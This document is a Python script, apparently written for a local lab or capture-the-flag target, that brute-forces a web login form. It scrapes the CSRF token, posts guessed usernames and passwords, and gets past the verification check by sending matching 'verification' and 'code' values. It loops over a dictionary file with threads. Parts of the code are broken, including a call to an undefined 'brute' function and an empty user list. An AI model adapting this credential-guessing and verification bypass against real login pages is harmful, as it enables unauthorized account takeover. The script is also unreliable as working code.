#coding=utf-8
import sys
import requests
import re
import base64
import time
import json
import random
import threading
from selenium import webdriver
from bs4 import BeautifulSoup

UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:56.0) Gecko/20100101 Firefox/56.0"
URL = 'http://127.0.0.1:5000/login'

def GET():
    session=requests.Session()
    s=session.get(URL)
    soup=BeautifulSoup(s.content,"html.parser")
    csrf_token=soup.find(id='csrf_token')['value']
    print(csrf_token)
    print("get successfully!")
    return csrf_token,session

def POST(user,password,UA,token,session):
        
        # what the verify code is does not matter, as long as 'verification'=='code'
        post_data = {}
        post_data['username'] = user
        post_data['password'] = password
        post_data['verification'] = 'b0ts'
        post_data['code']='B0TS'
        post_data['submit']='login'
        post_data['csrf_token']=token
        headers ={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Referer": "%s"%URL,
        "Connection": "close"}
        resp = session.post(url=URL,data=post_data,headers=headers)
        print("POST: "+user+"#"+password+" ")
        if resp.text.find('Login successfully')!=-1:
            print('*** find user:', user, 'with password:', password, '***')

# TODO: burst the psw
def main():
    tsk = []
    user_list = []
    f1 = open('dict.txt','r')
    for i in f1.readlines():
        password = i.strip()
        for j in user_list:
            user = j
            
            t = threading.Thread(target = brute,args = (user,password,UA))
            tsk.append(t)
    for t in tsk:
        t.start()
        t.join()#阻塞(0.1)

def DEBUG():
    user='TonyLin'
    password='123456'
    csrf_token,session=GET()
    POST(user,password,UA,csrf_token,session)

_DEBUG=True

if __name__ == '__main__':
    if _DEBUG:
        DEBUG()
    else:
        main()
